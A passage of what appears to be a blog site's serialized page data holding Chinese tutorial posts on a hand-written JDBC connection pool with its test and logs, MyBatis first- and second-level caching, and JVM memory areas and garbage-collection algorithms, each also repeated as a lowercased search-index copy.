配置文件。\n\njdbc.driver=com.mysql.cj.jdbc.driver\njdbc.url=jdbc:mysql://localhost:3306/imall?useunicode=true&characterencoding=utf-8&servertimezone=asia/shanghai&allowmultiqueries=true&usessl=false&requiressl=false&allowpublickeyretrieval=true&zerodatetimebehavior=converttonull\njdbc.username=root\njdbc.password=12345678\n\n# 初始化连接数\njdbc.initsize=3\n# 最大连接数\njdbc.maxsize=6\n#是否启动检查\njdbc.health=true\n#检查延迟时间\njdbc.delay=2000\n#间隔时间，重复获得连接的频率\njdbc.period=2000\n# 连接超时时间，10s\njdbc.timeout=100000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 简化连接池管理\n\nconnectionpoolmanager 负责操作一个连接从连接池的获取和释放。\n\npackage com.snail.source.code.jdbc.connection.manager;\n\nimport com.snail.source.code.jdbc.connection.pool.connectionpool;\nimport com.snail.source.code.jdbc.connection.pool.simpleconnectionpool;\nimport com.snail.source.code.jdbc.connection.properties.datasourceproperties;\nimport lombok.noargsconstructor;\n\nimport java.sql.connection;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/22\n */\n@noargsconstructor(access = lombok.accesslevel.private)\npublic class connectionpoolmanager {\n\n    private static final datasourceproperties config = new datasourceproperties();\n    private static final connectionpool connection_pool = new simpleconnectionpool(config);\n\n    /**\n     * 获取连接(重复利用机制)\n     *\n     * @return {@link connection }\n     */\n    public static connection getconnection() {\n        return connection_pool.getconnection();\n    }\n\n    /**\n     * 释放连接(可回收机制)\n     *\n     * @param connection 连接\n     */\n    public static void releaseconnection(connection connection) {\n        connection_pool.releaseconnection(connection);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 测试\n\n对手写的简化版 jdbc 连接池进行并发获取测试，验证核心功能。\n\n\n# 编写测试程序\n\npackage com.snail.source.code.jdbc.connection;\n\nimport com.snail.source.code.jdbc.connection.manager.connectionpoolmanager;\n\nimport java.sql.connection;\n\nimport static java.lang.thread.sleep;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/22\n */\npublic class testdatasource {\n\n    public static void main(string[] args) {\n        for (int i = 0; i < 10; i++) {\n            new thread(new threadconnection(), "thread-" + i).start();\n        }\n    }\n\n    static class threadconnection implements runnable {\n        @override\n        public void run() {\n            connection connection = connectionpoolmanager.getconnection();\n            try {\n                sleep(1000);\n            } catch (interruptedexception e) {\n                throw new runtimeexception(e);\n            }\n            connectionpoolmanager.releaseconnection(connection);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# 查看结果\n\n可以看到：初始化连接数为 3 个，最大连接数为 6 个。超过最大连接数会等待。最后释放连接。\n\n18:11:25.432 [thread-0] info simpleconnectionpool - 初始化连接池，当前连接数：3，初始化连接数：3, 最大连接数：6，空闲连接池：3，正在使用的连接池：0\n18:11:25.434 [thread-0] info simpleconnectionpool - [从空闲连接池获取连接]，当前连接数：3，最大连接数：6，空闲连接池：2，正在使用的连接池：1\n18:11:25.434 [thread-1] info simpleconnectionpool - [从空闲连接池获取连接]，当前连接数：3，最大连接数：6，空闲连接池：1，正在使用的连接池：2\n18:11:25.435 [thread-3] info simpleconnectionpool - [从空闲连接池获取连接]，当前连接数：3，最大连接数：6，空闲连接池：0，正在使用的连接池：3\n18:11:25.438 [thread-2] info simpleconnectionpool - [空闲连接池已满，未达到最大连接数，新建连接]，当前连接数：4，最大连接数：6，空闲连接池：0，正在使用的连接池：4\n18:11:25.440 [thread-4] info simpleconnectionpool - [空闲连接池已满，未达到最大连接数，新建连接]，当前连接数：5，最大连接数：6，空闲连接池：0，正在使用的连接池：5\n18:11:25.441 [thread-6] info simpleconnectionpool - [空闲连接池已满，未达到最大连接数，新建连接]，当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-7] info simpleconnectionpool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-9] info simpleconnectionpool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-8] info simpleconnectionpool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-5] info simpleconnectionpool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:26.437 [thread-3] info simpleconnectionpool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：1，正在使用的连接池：5\n18:11:26.438 [thread-0] info simpleconnectionpool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：2，正在使用的连接池：4\n18:11:26.438 [thread-1] info simpleconnectionpool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：3，正在使用的连接池：3\n18:11:26.443 [thread-2] info simpleconnectionpool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：4，正在使用的连接池：2\n18:11:26.444 [thread-6] info simpleconnectionpool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：5，正在使用的连接池：1\n18:11:26.444 [thread-4] info simpleconnectionpool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：6，正在使用的连接池：0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"MyBatis 中的一、二级缓存",frontmatter:{title:"MyBatis 中的一、二级缓存",date:"2021-04-23T00:00:00.000Z",tags:["MyBatis"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/mybatis%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98.html",relativePath:"views/backend/mybatis一二级缓存.md",key:"v-4cee59ee",path:"/views/backend/mybatis%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98.html",headers:[{level:2,title:"MyBatis 一级缓存介绍",slug:"mybatis-一级缓存介绍",normalizedTitle:"mybatis 一级缓存介绍",charIndex:3},{level:3,title:"一级缓存是如何失效的",slug:"一级缓存是如何失效的",normalizedTitle:"一级缓存是如何失效的",charIndex:23},{level:2,title:"MyBatis 二级缓存介绍",slug:"mybatis-二级缓存介绍",normalizedTitle:"mybatis 二级缓存介绍",charIndex:37},{level:3,title:"二级缓存开启条件",slug:"二级缓存开启条件",normalizedTitle:"二级缓存开启条件",charIndex:57},{level:3,title:"是否应该使用二级缓存？",slug:"是否应该使用二级缓存",normalizedTitle:"是否应该使用二级缓存？",charIndex:71},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:86}],headersStr:"MyBatis 一级缓存介绍 一级缓存是如何失效的 MyBatis 二级缓存介绍 二级缓存开启条件 是否应该使用二级缓存？ 其他",content:' * MyBatis 一级缓存介绍\n   * 一级缓存是如何失效的\n * MyBatis 二级缓存介绍\n   * 二级缓存开启条件\n   * 是否应该使用二级缓存？\n * 其他\n\n\n\n\n# MyBatis 一级缓存介绍\n\n一级缓存是 SqlSession级别 的缓存。在操作数据库时需要构造 sqlSession 对象，在对象中有一个(内存区域)数据结构（HashMap）用于存储缓存数据。不同的 sqlSession 之间的缓存数据区域（HashMap）是互相不影响的。用一张图来表示一下一级缓存，其中每一个 SqlSession 的内部都会有一个一级缓存对象。\n\n\n\n在应用运行过程中，我们有可能在一次数据库会话中，执行多次查询条件完全相同的SQL，MyBatis 提供了一级缓存的方案优化这部分场景，如果是相同的SQL语句，会优先命中一级缓存，避免直接对数据库进行查询，提高性能。\n\n\n# 一级缓存是如何失效的\n\n 1. 增删改操作会清空缓存\n\n 2. 不同请求（会话）中的同一个查询，各是各自的缓存，一级缓存是基于会话的。\n    \n    需要注意的是 当Mybatis整合Spring后，直接通过Spring注入Mapper的形式，如果不是在同一个事务中每个Mapper的每次查询操作都对应一个全新的SqlSession实例，这个时候就不会有一级缓存的命中，但是在同一个事务中时共用的是同一个SqlSession。\n\n\n# MyBatis 二级缓存介绍\n\nMyBatis 一级缓存最大的共享范围就是一个SqlSession内部，那么如果多个 SqlSession 需要共享缓存，则需要开启二级缓存，开启二级缓存后，会使用 CachingExecutor 装饰 Executor，进入一级缓存的查询流程前，先在CachingExecutor 进行二级缓存的查询，具体的工作流程如下所示\n\n\n\n当二级缓存开启后，同一个命名空间(namespace) 所有的操作语句，都影响着一个共同的 cache，也就是二级缓存被多个 SqlSession 共享，是一个全局的变量。当开启缓存后，数据的查询执行的流程就是 二级缓存 -> 一级缓存 -> 数据库。\n\n\n# 二级缓存开启条件\n\n二级缓存默认是不开启的，需要手动开启二级缓存，实现二级缓存的时候，MyBatis要求返回的POJO必须是可序列化的。开启二级缓存的条件也是比较简单，通过直接在 MyBatis 配置文件中通过\n\n<settings>\n\t<setting name = "cacheEnabled" value = "true" />\n</settings>\n\n\n1\n2\n3\n\n\n来开启二级缓存，还需要在 Mapper 的xml 配置文件中加入 <cache>标签\n\n\n# 是否应该使用二级缓存？\n\n那么究竟应该不应该使用二级缓存呢？先来看一下二级缓存的注意事项：\n\n 1. 缓存是以namespace为单位的，不同namespace下的操作互不影响。\n 2. insert,update,delete操作会清空所在namespace下的全部缓存。\n 3. 通常使用MyBatis Generator生成的代码中，都是各个表独立的，每个表都有自己的namespace。\n 4. 多表操作一定不要使用二级缓存，因为多表操作进行更新操作，一定会产生脏数据。（同一个namespace下，多表级联第一次查询后，对其中一张单表更新，再次查询多表级联语句，还是返回第一次查询后的）\n\n如果你遵守二级缓存的注意事项，那么你就可以使用二级缓存。\n\n但是，如果不能使用多表操作，二级缓存不就可以用一级缓存来替换掉吗？而且二级缓存是表级缓存，开销大，没有一级缓存直接使用 HashMap 来存储的效率更高，所以二级缓存并不推荐使用。\n\n\n# 其他\n\nMyBatis 一级缓存\n\nMyBatis 二级缓存',normalizedContent:' * mybatis 一级缓存介绍\n   * 一级缓存是如何失效的\n * mybatis 二级缓存介绍\n   * 二级缓存开启条件\n   * 是否应该使用二级缓存？\n * 其他\n\n\n\n\n# mybatis 一级缓存介绍\n\n一级缓存是 sqlsession级别 的缓存。在操作数据库时需要构造 sqlsession 对象，在对象中有一个(内存区域)数据结构（hashmap）用于存储缓存数据。不同的 sqlsession 之间的缓存数据区域（hashmap）是互相不影响的。用一张图来表示一下一级缓存，其中每一个 sqlsession 的内部都会有一个一级缓存对象。\n\n\n\n在应用运行过程中，我们有可能在一次数据库会话中，执行多次查询条件完全相同的sql，mybatis 提供了一级缓存的方案优化这部分场景，如果是相同的sql语句，会优先命中一级缓存，避免直接对数据库进行查询，提高性能。\n\n\n# 一级缓存是如何失效的\n\n 1. 增删改操作会清空缓存\n\n 2. 不同请求（会话）中的同一个查询，各是各自的缓存，一级缓存是基于会话的。\n    \n    需要注意的是 当mybatis整合spring后，直接通过spring注入mapper的形式，如果不是在同一个事务中每个mapper的每次查询操作都对应一个全新的sqlsession实例，这个时候就不会有一级缓存的命中，但是在同一个事务中时共用的是同一个sqlsession。\n\n\n# mybatis 二级缓存介绍\n\nmybatis 一级缓存最大的共享范围就是一个sqlsession内部，那么如果多个 sqlsession 需要共享缓存，则需要开启二级缓存，开启二级缓存后，会使用 cachingexecutor 装饰 executor，进入一级缓存的查询流程前，先在cachingexecutor 进行二级缓存的查询，具体的工作流程如下所示\n\n\n\n当二级缓存开启后，同一个命名空间(namespace) 所有的操作语句，都影响着一个共同的 cache，也就是二级缓存被多个 sqlsession 共享，是一个全局的变量。当开启缓存后，数据的查询执行的流程就是 二级缓存 -> 一级缓存 -> 数据库。\n\n\n# 二级缓存开启条件\n\n二级缓存默认是不开启的，需要手动开启二级缓存，实现二级缓存的时候，mybatis要求返回的pojo必须是可序列化的。开启二级缓存的条件也是比较简单，通过直接在 mybatis 配置文件中通过\n\n<settings>\n\t<setting name = "cacheenabled" value = "true" />\n</settings>\n\n\n1\n2\n3\n\n\n来开启二级缓存，还需要在 mapper 的xml 配置文件中加入 <cache>标签\n\n\n# 是否应该使用二级缓存？\n\n那么究竟应该不应该使用二级缓存呢？先来看一下二级缓存的注意事项：\n\n 1. 缓存是以namespace为单位的，不同namespace下的操作互不影响。\n 2. insert,update,delete操作会清空所在namespace下的全部缓存。\n 3. 通常使用mybatis generator生成的代码中，都是各个表独立的，每个表都有自己的namespace。\n 4. 多表操作一定不要使用二级缓存，因为多表操作进行更新操作，一定会产生脏数据。（同一个namespace下，多表级联第一次查询后，对其中一张单表更新，再次查询多表级联语句，还是返回第一次查询后的）\n\n如果你遵守二级缓存的注意事项，那么你就可以使用二级缓存。\n\n但是，如果不能使用多表操作，二级缓存不就可以用一级缓存来替换掉吗？而且二级缓存是表级缓存，开销大，没有一级缓存直接使用 hashmap 来存储的效率更高，所以二级缓存并不推荐使用。\n\n\n# 其他\n\nmybatis 一级缓存\n\nmybatis 二级缓存',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"JVM 和 GC",frontmatter:{title:"JVM 和 GC",date:"2020-01-12T00:00:00.000Z",tags:["jvm","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/jvm.html",relativePath:"views/backend/jvm.md",key:"v-4ac986b4",path:"/views/backend/jvm.html",headers:[{level:2,title:"JVM",slug:"jvm",normalizedTitle:"jvm",charIndex:3},{level:3,title:"类装载器",slug:"类装载器",normalizedTitle:"类装载器",charIndex:12},{level:4,title:"ClassLoader的双亲委派机制",slug:"classloader的双亲委派机制",normalizedTitle:"classloader的双亲委派机制",charIndex:442},{level:3,title:"Execution Engine执行引擎",slug:"execution-engine执行引擎",normalizedTitle:"execution engine执行引擎",charIndex:22},{level:3,title:"Native Interface本地接口",slug:"native-interface本地接口",normalizedTitle:"native interface本地接口",charIndex:48},{level:3,title:"永久代（元空间）",slug:"永久代-元空间",normalizedTitle:"永久代（元空间）",charIndex:74},{level:3,title:"栈 stack",slug:"栈-stack",normalizedTitle:"栈 stack",charIndex:88},{level:3,title:"堆 heap",slug:"堆-heap",normalizedTitle:"堆 heap",charIndex:101},{level:3,title:"jvm 调优",slug:"jvm-调优",normalizedTitle:"jvm 调优",charIndex:113},{level:2,title:"GC",slug:"gc",normalizedTitle:"gc",charIndex:123},{level:3,title:"MinorGC的过程（复制->清空->互换）",slug:"minorgc的过程-复制-清空-互换",normalizedTitle:"minorgc的过程（复制-&gt;清空-&gt;互换）",charIndex:null},{level:3,title:"GC算法",slug:"gc算法",normalizedTitle:"gc算法",charIndex:159},{level:2,title:"Minor GC 和 Full GC",slug:"minor-gc-和-full-gc",normalizedTitle:"minor gc 和 full gc",charIndex:167},{level:2,title:"栈溢出和堆溢出",slug:"栈溢出和堆溢出",normalizedTitle:"栈溢出和堆溢出",charIndex:189}],headersStr:"JVM 类装载器 ClassLoader的双亲委派机制 Execution Engine执行引擎 Native Interface本地接口 永久代（元空间） 栈 stack 堆 heap jvm 调优 GC MinorGC的过程（复制->清空->互换） GC算法 Minor GC 和 Full GC 栈溢出和堆溢出",content:" * JVM\n   * 类装载器\n   * Execution Engine执行引擎\n   * Native Interface本地接口\n   * 永久代（元空间）\n   * 栈 stack\n   * 堆 heap\n   * jvm 调优\n * GC\n   * MinorGC的过程（复制->清空->互换）\n   * GC算法\n * Minor GC 和 Full GC\n * 栈溢出和堆溢出\n\n\n\n\n# JVM\n\n * JVM是运行在操作系统之上的，它与硬件没有直接的交互\n\n\n\n\n# 类装载器\n\n 1. 启动类加载器（Bootstrap）C++编写：Java程序入口，加载Java基础包\n 2. 扩展类加载器（Extension）Java编写：加载 javax 包\n 3. 应用类加载器（AppClassLoader）Java编写：加载我们自己写的类\n 4. 用户自定义加载器：对自带的三种加载器不满足的话，继承ClassLoader，自定义一个我们自己需求的类加载器\n\n\n\n# ClassLoader的双亲委派机制\n\n * 比如我们自己也写了一个名为Java.Lang.String的类，但启动会报错，因为Java类加载是从顶部的启动类加载器：Bootstrap开始加载的\n\n> 当一个类收到了类加载请求，它首先不会尝试自己去加载这个类，而是把这个请求委派给父类去完成。\n> \n> 每一个层次的类加载器都是如此，因此所有的加载请求都应该传送到BootStrap中，只有当父类加载器反馈无法完成这个请求的时候（在它的加载路径下没有找到所需的Class文件），子类加载器才会尝试自己去加载。\n\n * 正因为这样，所以Java是沙箱安全的：防止我们自己写的代码污染Java源代码\n\n\n# Execution Engine执行引擎\n\n * 相当于解释执行器：负责将.Class二进制代码文件翻译为操作系统能读懂的机器码，提交操作系统执行\n\n\n# Native Interface本地接口\n\n * 本地接口的作用是融合不同的编程语言为 Java 所用，它的初衷是融合 C/C++程序，Java 诞生的时候是 C/C++横行的时候，要想立足，必须调用 C/C++程序，于是就在内存中专门开辟了一块区域处理标记为native的代码，它的具体做法是 Native Method Stack中登记 native方法，在Execution Engine 执行时加载native libraies。\n * 目前该方法使用的越来越少了，除非是与硬件有关的应用，比如通过Java程序驱动打印机或者Java系统管理生产设备，在企业级应用中已经比较少见。因为现在的架构领域间的通信很发达，比如可以使用 Socket通信，也可以使用Web Service等等，不多做介绍。\n\n\n# 永久代（元空间）\n\n * 永久存储区是一个常驻内存区域，用于存放JDK自身所携带的 Class,Interface 的元数据，也就是说它存储的是运行环境必须的类信息，被装载进此区域的数据是不会被垃圾回收器回收掉的，关闭 JVM 才会释放此区域所占用的内存。\n\n\n# 栈 stack\n\n * 先进后出，负责Java程序的运行，随着线程的创建而开始，随着线程的消亡而结束\n * 在程序从第一个方法（main）开始运行时，每个方法执行的同时都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接、方法出口等信息\n * 栈帧中主要保存3 类数据：\n   1. 本地变量（Local Variables）：输入参数和输出参数以及方法内的变量\n   2. 栈操作（Operand Stack）：记录出栈、入栈的操作\n   3. 栈帧数据（Frame Data）：包括类文件、方法等等\n\n\n\n\n# 堆 heap\n\n\n\n 1. 新生代\n    * 伊甸区：占新生代的8/10 （98%的GC回收都在这）\n    * from区： 占新生代的 1/10 （ GC杀完伊甸区没杀干净的 ）\n    * to区： 占新生代的 1/10 （ GC杀伊甸区和from区没杀干净的 ）\n 2. 老年代\n    * GC回收完新生代后残余的（新生代活过15次的）占堆内存的 2/3\n    * GC回收一般只在新生代，只有Full GC的时候才会回收老年代\n 3. 元空间\n    * 跟堆内存没有关系\n\n * 堆调优\n   \n   参数                   含义\n   -Xms                 设置初始分配大小，默认为物理内存的 1/64\n   -Xmx                 最大分配内存，默认为物理内存的 1/4\n   -XX:PrintGCDetails   输出详细的GC处理日志\n   \n   一般jvm调优指的就是堆调优\n\n\n# jvm 调优\n\n * 如何调优：一般初始内存-Xms和最大内存-Xmx调成一样大小，避免GC和应用程序争抢内存，导致内存值忽高忽低\n\n * 配置：在IDEA中 -> 菜单栏Run -> Eidt Configurations -> VM optioins 中输入调优参数\n\n * OOM: java.lang.OutOfMemory：\n\n> 比方说配置的堆内存是4M，但是我们new了一个5M的数组，就会报堆内存溢出异常\n\n> 如果出现java.lang.OutOfMemoryError: Java heap space异常，说明Java虚拟机的堆内存不够。原因有二： （1）Java虚拟机的堆内存设置不够，可以通过参数-Xms、-Xmx来调整。 （2）代码中创建了大量大对象，并且长时间不能被垃圾收集器收集（存在被引用）。\n\n\n# GC\n\n\n\n\n# MinorGC的过程（复制->清空->互换）\n\n 1. eden、SurvivorFrom 复制到 SurvivorTo，年龄+1 首先，当Eden区满的时候会触发第一次GC,把还活着的对象拷贝到SurvivorFrom区，当Eden区再次触发GC的时候会扫描Eden区和From区域,对这两个区域进行垃圾回收，经过这次回收后还存活的对象,则直接复制到To区域（如果有对象的年龄已经达到了老年的标准，则赋值到老年代区），同时把这些对象的年龄+1\n 2. 清空 eden、SurvivorFrom 然后，清空Eden和SurvivorFrom中的对象，也即复制之后有交换，谁空谁是to\n 3. SurvivorTo和 SurvivorFrom 互换 最后，SurvivorTo和SurvivorFrom互换，原SurvivorTo成为下一次GC时的SurvivorFrom区。部分对象会在From和To区域中复制来复制去,如此交换15次(由JVM参数MaxTenuringThreshold决定,这个参数默认是15),最终如果还是存活,就存入到老年代\n\n\n# GC算法\n\n 1. 引用计数法\n    \n    what：记录的是一个对象被引用的次数（有几个箭头指向我这个地址），如果有人用我就+1，没人用我就-1，到0的时候就被回收\n    \n    缺点：1）每次对象赋值的时候都要维护计数器，且计数器本身也有一定的消耗。2）较难处理循环引用\n    \n    谁用了：微软的COM，python\n\n 2. 复制算法\n    \n    > 年轻代中使用的Minor GC，这种GC算法用的就是复制算法\n    \n    \n    \n    缺点： 消耗空间（每次都从from区复制到to区，也正是from区和to区所占空间为1:1的原因）\n    \n    （对象存活率非常低才适合用）\n    \n    优点：不会产生内存碎片，效率高\n\n 3. 标记清除法\n    \n    > 老年代一般是由标记清除或者是标记清除与标记整理的混合实现\n    \n    \n    \n    \n    \n    what：算法分为“标记”和“清除”两个阶段，首先标记出所需要回收的对象，在标记完成后统一回收掉所有被标记的对象。\n    \n    缺点：1）效率问题：标记和清除的效率都不高(遍历)。2）空间问题：标记清除之后会产生大量不连续的内存碎片，空间碎片太多会导致大对象无法分配到足够的连续内存，从而不得不提前触发GC，甚至程序中断。\n\n 4. 标记整理法\n    \n    \n    \n    在标记清除后，再对存活对象内存和可用内存进行一遍有序整理（相当于解决内存碎片问题），相当于标记清除的升级版，但效率肯定更慢一点。\n\n 5. 分代收集算法\n    \n    次数上频繁收集young区，次数上较少收集old区，基本不动元空间\n\n\n# Minor GC 和 Full GC\n\n> 都发生在堆中\n\n * Minor GC：是新生代GC，指的是发生在新生代的垃圾收集动作。由于Java对象大都是朝生夕死，所以Minor GC的发生非常频繁，一般回收速度也比较快。\n\n * Full GC/Major GC：是老年代的GC，出现Major GC一般都伴有Minor GC，Major GC肯定比Minor GC慢很多。\n\n * 何时发生？\n   \n   Minor GC：当jvm无法为新对象分配空间的时候就会发生Minor GC，所以new对象的频率越高，越容易触发。\n   \n   Full GC：① 当老年代空间不足的时候会触发Full GC，Full GC 会同时将老年代和新生代的垃圾进行回收。 ②当发生Minor GC的时候可能触发Full GC，由于老年代要对年轻代进行担保，由于进行一次垃圾回收之前是无法确定有多少对象存活，因此老年代并不知道自己要担保多少空间，因此老年代采用动态估值的方法：也就是上一次回收发送时晋升到老年代的对象容量的平均值作为经验值，这样就会有一个问题，当发生一次Minor GC之后，存活的对象剧增（假设），但此时老年代并没有满，但是此时平均值增加了，就会发生Full GC。\n\n\n# 栈溢出和堆溢出\n\n * 栈溢出：栈溢出是指不断的调用方法，不断的压栈，最终超出了栈允许的栈深度，就会发生栈溢出，比如递归操作没有终止，死循环。\n\n * 栈内存溢出：对于一台服务器而言，每一个用户请求，都会产生一个线程来处理这个请求，每一个线程对应着一个栈，栈会分配内存，此时如果请求过多，这时候内存不够了，就会发生栈内存溢出。\n\n * 堆溢出：不断的new 一个对象，一直创建新的对象， 或者直接创建的对象太大了超过了堆内存（夸张的说）。",normalizedContent:" * jvm\n   * 类装载器\n   * execution engine执行引擎\n   * native interface本地接口\n   * 永久代（元空间）\n   * 栈 stack\n   * 堆 heap\n   * jvm 调优\n * gc\n   * minorgc的过程（复制->清空->互换）\n   * gc算法\n * minor gc 和 full gc\n * 栈溢出和堆溢出\n\n\n\n\n# jvm\n\n * jvm是运行在操作系统之上的，它与硬件没有直接的交互\n\n\n\n\n# 类装载器\n\n 1. 启动类加载器（bootstrap）c++编写：java程序入口，加载java基础包\n 2. 扩展类加载器（extension）java编写：加载 javax 包\n 3. 应用类加载器（appclassloader）java编写：加载我们自己写的类\n 4. 用户自定义加载器：对自带的三种加载器不满足的话，继承classloader，自定义一个我们自己需求的类加载器\n\n\n\n# classloader的双亲委派机制\n\n * 比如我们自己也写了一个名为java.lang.string的类，但启动会报错，因为java类加载是从顶部的启动类加载器：bootstrap开始加载的\n\n> 当一个类收到了类加载请求，它首先不会尝试自己去加载这个类，而是把这个请求委派给父类去完成。\n> \n> 每一个层次的类加载器都是如此，因此所有的加载请求都应该传送到bootstrap中，只有当父类加载器反馈无法完成这个请求的时候（在它的加载路径下没有找到所需的class文件），子类加载器才会尝试自己去加载。\n\n * 正因为这样，所以java是沙箱安全的：防止我们自己写的代码污染java源代码\n\n\n# execution engine执行引擎\n\n * 相当于解释执行器：负责将.class二进制代码文件翻译为操作系统能读懂的机器码，提交操作系统执行\n\n\n# native interface本地接口\n\n * 本地接口的作用是融合不同的编程语言为 java 所用，它的初衷是融合 c/c++程序，java 诞生的时候是 c/c++横行的时候，要想立足，必须调用 c/c++程序，于是就在内存中专门开辟了一块区域处理标记为native的代码，它的具体做法是 native method stack中登记 native方法，在execution engine 执行时加载native libraies。\n * 目前该方法使用的越来越少了，除非是与硬件有关的应用，比如通过java程序驱动打印机或者java系统管理生产设备，在企业级应用中已经比较少见。因为现在的架构领域间的通信很发达，比如可以使用 socket通信，也可以使用web service等等，不多做介绍。\n\n\n# 永久代（元空间）\n\n * 永久存储区是一个常驻内存区域，用于存放jdk自身所携带的 class,interface 的元数据，也就是说它存储的是运行环境必须的类信息，被装载进此区域的数据是不会被垃圾回收器回收掉的，关闭 jvm 才会释放此区域所占用的内存。\n\n\n# 栈 stack\n\n * 先进后出，负责java程序的运行，随着线程的创建而开始，随着线程的消亡而结束\n * 在程序从第一个方法（main）开始运行时，每个方法执行的同时都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接、方法出口等信息\n * 栈帧中主要保存3 类数据：\n   1. 本地变量（local variables）：输入参数和输出参数以及方法内的变量\n   2. 栈操作（operand stack）：记录出栈、入栈的操作\n   3. 栈帧数据（frame data）：包括类文件、方法等等\n\n\n\n\n# 堆 heap\n\n\n\n 1. 新生代\n    * 伊甸区：占新生代的8/10 （98%的gc回收都在这）\n    * from区： 占新生代的 1/10 （ gc杀完伊甸区没杀干净的 ）\n    * to区： 占新生代的 1/10 （ gc杀伊甸区和from区没杀干净的 ）\n 2. 老年代\n    * gc回收完新生代后残余的（新生代活过15次的）占堆内存的 2/3\n    * gc回收一般只在新生代，只有full gc的时候才会回收老年代\n 3. 元空间\n    * 跟堆内存没有关系\n\n * 堆调优\n   \n   参数                   含义\n   -xms                 设置初始分配大小，默认为物理内存的 1/64\n   -xmx                 最大分配内存，默认为物理内存的 1/4\n   -xx:printgcdetails   输出详细的gc处理日志\n   \n   一般jvm调优指的就是堆调优\n\n\n# jvm 调优\n\n * 如何调优：一般初始内存-xms和最大内存-xmx调成一样大小，避免gc和应用程序争抢内存，导致内存值忽高忽低\n\n * 配置：在idea中 -> 菜单栏run -> eidt configurations -> vm optioins 中输入调优参数\n\n * oom: java.lang.outofmemory：\n\n> 比方说配置的堆内存是4m，但是我们new了一个5m的数组，就会报堆内存溢出异常\n\n> 如果出现java.lang.outofmemoryerror: java heap space异常，说明java虚拟机的堆内存不够。原因有二： （1）java虚拟机的堆内存设置不够，可以通过参数-xms、-xmx来调整。 （2）代码中创建了大量大对象，并且长时间不能被垃圾收集器收集（存在被引用）。\n\n\n# gc\n\n\n\n\n# minorgc的过程（复制->清空->互换）\n\n 1. eden、survivorfrom 复制到 survivorto，年龄+1 首先，当eden区满的时候会触发第一次gc,把还活着的对象拷贝到survivorfrom区，当eden区再次触发gc的时候会扫描eden区和from区域,对这两个区域进行垃圾回收，经过这次回收后还存活的对象,则直接复制到to区域（如果有对象的年龄已经达到了老年的标准，则赋值到老年代区），同时把这些对象的年龄+1\n 2. 清空 eden、survivorfrom 然后，清空eden和survivorfrom中的对象，也即复制之后有交换，谁空谁是to\n 3. survivorto和 survivorfrom 互换 最后，survivorto和survivorfrom互换，原survivorto成为下一次gc时的survivorfrom区。部分对象会在from和to区域中复制来复制去,如此交换15次(由jvm参数maxtenuringthreshold决定,这个参数默认是15),最终如果还是存活,就存入到老年代\n\n\n# gc算法\n\n 1. 引用计数法\n    \n    what：记录的是一个对象被引用的次数（有几个箭头指向我这个地址），如果有人用我就+1，没人用我就-1，到0的时候就被回收\n    \n    缺点：1）每次对象赋值的时候都要维护计数器，且计数器本身也有一定的消耗。2）较难处理循环引用\n    \n    谁用了：微软的com，python\n\n 2. 复制算法\n    \n    > 年轻代中使用的minor gc，这种gc算法用的就是复制算法\n    \n    \n    \n    缺点： 消耗空间（每次都从from区复制到to区，也正是from区和to区所占空间为1:1的原因）\n    \n    （对象存活率非常低才适合用）\n    \n    优点：不会产生内存碎片，效率高\n\n 3. 标记清除法\n    \n    > 老年代一般是由标记清除或者是标记清除与标记整理的混合实现\n    \n    \n    \n    \n    \n    what：算法分为“标记”和“清除”两个阶段，首先标记出所需要回收的对象，在标记完成后统一回收掉所有被标记的对象。\n    \n    缺点：1）效率问题：标记和清除的效率都不高(遍历)。2）空间问题：标记清除之后会产生大量不连续的内存碎片，空间碎片太多会导致大对象无法分配到足够的连续内存，从而不得不提前触发gc，甚至程序中断。\n\n 4. 标记整理法\n    \n    \n    \n    在标记清除后，再对存活对象内存和可用内存进行一遍有序整理（相当于解决内存碎片问题），相当于标记清除的升级版，但效率肯定更慢一点。\n\n 5. 分代收集算法\n    \n    次数上频繁收集young区，次数上较少收集old区，基本不动元空间\n\n\n# minor gc 和 full gc\n\n> 都发生在堆中\n\n * minor 